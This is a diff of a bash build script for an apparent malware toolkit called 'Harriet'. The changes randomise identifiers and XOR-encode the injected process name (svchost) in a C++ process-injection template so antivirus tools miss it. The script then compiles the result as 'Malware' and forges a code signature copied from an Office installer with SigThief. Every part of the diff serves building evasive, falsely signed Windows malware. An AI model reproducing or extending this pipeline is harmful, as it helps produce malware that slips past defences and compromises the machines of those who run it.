@@ -102,11 +102,22 @@ cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
 Random8=$(cat shell.txt)
 sed -i "s/Random8/$Random8/g" Harriet/FULLInj/Resources/template.cpp
 
+#Exec VARIABLE
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
+Random8=$(cat shell.txt)
+sed -i "s/Random8/$Random8/g" Harriet/FULLInj/Resources/template.cpp
+
+#PROCESS NAME VARIABLE
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-6} | head -n 1 > shell.txt
+Random9=$(cat shell.txt)
+sed -i "s/Random9/$Random9/g" Harriet/FULLInj/Resources/template.cpp
+
 #XOR KEY VALUE
 cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > shell.txt
 XOR_KEY=$(cat shell.txt)
 sed -i "s/XOR_KEY/$XOR_KEY/g" Harriet/FULLInj/Resources/template.cpp
 sed -i "s/XOR_KEY/$XOR_KEY/g" Harriet/FULLInj/Resources/xor.py
+
 #XOR KEY VARIABLE
 cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > shell.txt
 XOR_VARIABLE=$(cat shell.txt)
@@ -114,7 +125,7 @@ sed -i "s/XOR_VARIABLE/$XOR_VARIABLE/g" Harriet/FULLInj/Resources/template.cpp
 #sed -i "s/XOR_VARIABLE/$XOR_VARIABLE/g" Harriet/FULLInj/Resources/xor.py
 
 #Process Migration
-sed -i "s/SVCHOST/$SVCHOST/g" Harriet/FULLInj/Resources/template.cpp
+#sed -i "s/SVCHOST/$SVCHOST/g" Harriet/FULLInj/Resources/template.cpp
 
 
 #VIRTUALALLOC - Variable Name
@@ -132,6 +143,16 @@ virt2="${virt::-8}"
 sed -i "s/VIRALO/$virt2/g" Harriet/FULLInj/Resources/template.cpp 
 rm virt*
 
+#PROCESS STRING
+
+echo $SVCHOST > proc.txt
+python Harriet/FULLInj/Resources/xor.py proc.txt > proc2.txt
+process=$(cat proc2.txt)
+process2="${process::-8}" 
+sed -i "s/PROCY/$process2/g" Harriet/FULLInj/Resources/template.cpp 
+rm proc*
+
+
 #Compiling Malware
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
 x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLInj/Resources/template.cpp -fpermissive -Wno-narrowing >/dev/null 2>&1
@@ -148,4 +169,5 @@ python3 Harriet/Resources/SigThief/sigthief.py -i Harriet/Resources/OfficeSetup.
 mv signed$MALWARE $MALWARE
 echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
 echo ""
+
 
